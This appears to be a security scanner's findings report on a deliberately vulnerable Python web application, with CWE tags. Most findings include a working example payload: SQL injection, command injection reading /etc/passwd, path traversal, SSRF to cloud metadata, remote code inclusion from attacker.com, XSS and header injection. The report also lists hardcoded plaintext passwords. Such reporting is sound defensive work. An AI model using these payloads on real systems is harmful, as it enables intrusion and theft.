extra.message: DOM-based XSS: User-controlled data from document.location.hash is decoded with decodeURIComponent() and injected into the DOM via document.write() without sanitization. An attacker can craft a URL with a malicious hash fragment (e.g. #lang=) to execute arbitrary JavaScript in the victim's browser.

Hardcoded plaintext passwords in USERS_XML source code: '7en8aiDoh!', '12345', 'gandalf', 'phest1945'. Credentials should never be stored in source code as they can be extracted by anyone with access to the code repository.

SQL Injection: User input params['id'] is directly concatenated into the SQL query string passed to cursor.execute(). An attacker can inject arbitrary SQL, e.g. ?id=1 UNION SELECT NULL,username,password,NULL FROM users to extract all credentials.

Cross-site Scripting: Database query results are rendered directly into HTML table cells using '%s' without html.escape(). An attacker who injects HTML/JavaScript via SQL injection (UNION SELECT) can achieve reflected XSS when the results page is rendered.

Cross-site Scripting: User input params['v'] is directly interpolated into HTML content via re.sub() replacement string ('r"\g<1>%s\g<2>" % params["v"]'). This injects unsanitized user input into the HTML output, allowing arbitrary JavaScript execution.

Insecure Deserialization: User input params['object'] is passed directly to pickle.loads(). Pickle deserialization can execute arbitrary Python code, giving an attacker full remote code execution. This is one of the most dangerous Python vulnerabilities.

Path Traversal: User input params['path'] is passed directly to open() via os.path.abspath() when the value does not contain '://'. An attacker can read arbitrary files on the server, e.g. ?path=/etc/passwd or ?path=../../../etc/shadow.

cwe: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

extra.message: Server-Side Request Forgery: When params['path'] contains '://', it is passed directly to urllib.request.urlopen(), allowing the server to make requests to arbitrary URLs. An attacker can probe internal services, access cloud metadata endpoints (e.g. http://169.254.169.254/), or port-scan internal networks.

OS Command Injection: User input params['domain'] is concatenated directly into a shell command string ('nslookup ' + params['domain']) executed via subprocess.run() with shell=True. An attacker can inject arbitrary OS commands, e.g. ?domain=google.com;cat+/etc/passwd or ?domain=google.com%60whoami%60 for full remote code execution.

XML External Entity (XXE) Injection: User input params['xml'] is parsed by lxml.etree.parse() with an XMLParser configured with load_dtd=True, resolve_entities=True, and no_network=False. This allows an attacker to define external entities that can read local files, perform SSRF, or cause denial of service via entity expansion.

cwe: CWE-611: Improper Restriction of XML External Entity Reference

extra.message: XPath Injection: User input params['name'] is directly concatenated into an XPath expression ('.//user[name/text()=\'%s\']' % params['name']). An attacker can manipulate the XPath query to extract data from the XML document, e.g. ?name=' or '1'='1 to retrieve all users.

cwe: CWE-643: Improper Neutralization of Data within XPath Expressions

extra.message: Denial of Service: User input params['size'] controls both the string multiplication ('#' * int(params['size'])) and the loop iteration count (range(int(params['size']))), with no bounds checking. An attacker can supply a very large value (e.g. ?size=999999999) to exhaust server memory and CPU, causing denial of service.

SQL Injection: User input params['comment'] is directly string-interpolated into an INSERT SQL statement ('INSERT INTO comments VALUES(NULL, \'%s\', \'%s\')' % (params['comment'], ...)). An attacker can inject arbitrary SQL, e.g. ?comment='); DROP TABLE comments;-- to delete the comments table or extract data from other tables.

Stored Cross-site Scripting: Comment data from the database is rendered directly into HTML table cells using '%s' without html.escape(). Since comments come from user input (stored via the /?comment= endpoint), an attacker can store malicious JavaScript that executes in any user's browser when viewing comments.

Path Traversal / Remote File Inclusion: User input params['include'] is passed directly to open() for local files (when '://' is not present), allowing arbitrary file reads on the server, e.g. ?include=/etc/passwd.

cwe: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

extra.message: Server-Side Request Forgery: When params['include'] contains '://', it is passed to urllib.request.urlopen() to fetch remote content, enabling SSRF attacks. An attacker can make the server fetch internal resources, e.g. ?include=http://169.254.169.254/latest/meta-data/.

Code Injection / Remote Code Execution: Content fetched from user-controlled file/URL (params['include']) is executed as Python code via exec(program, envs). Combined with the path traversal or SSRF in the include parameter, this gives an attacker full remote code execution, e.g. by hosting a malicious Python script and including it via ?include=http://attacker.com/evil.py.

Open Redirect: User input params['redir'] is injected directly into a meta refresh tag's URL attribute without validation. An attacker can craft a link that redirects victims to a malicious site, e.g. ?redir=https://evil.com, which is useful for phishing attacks.

cwe: CWE-601: URL Redirect to Untrusted Site ('Open Redirect')

extra.message: Cross-site Scripting via JSONP: User input params['callback'] is directly interpolated into the JavaScript response as a function call wrapper ('%s(' % params['callback']). An attacker can inject arbitrary JavaScript, e.g. ?callback=alert(document.cookie)//, which executes in the victim's browser when they visit the crafted URL.

SQL Injection in login: The password parameter params.get('password', '') is directly concatenated into the SQL query without sanitization. While the username is stripped of non-word characters via re.sub(r'[^\w]', '', ...), the password field is not sanitized, allowing login bypass via SQL injection, e.g. ?password=' OR '1' LIKE '1.

Information Disclosure: When an exception occurs, the full Python traceback (traceback.format_exc()) is returned to the user. This can leak sensitive internal information such as file paths, database schema details, variable names, and application logic, aiding attackers in further exploitation.

cwe: CWE-209: Generation of Error Message Containing Sensitive Information

extra.message: Security Misconfiguration: The X-XSS-Protection header is explicitly set to '0', which disables the browser's built-in XSS filter. This removes a defense-in-depth mechanism that could help mitigate reflected XSS attacks in older browsers.

HTTP Header Injection: User input params.get('charset', 'utf8') is directly interpolated into the Content-Type HTTP header without validation or sanitization. An attacker can inject CRLF characters to add arbitrary HTTP headers or split the response, e.g. ?charset=utf8%0d%0aSet-Cookie:evil=value.

cwe: CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers
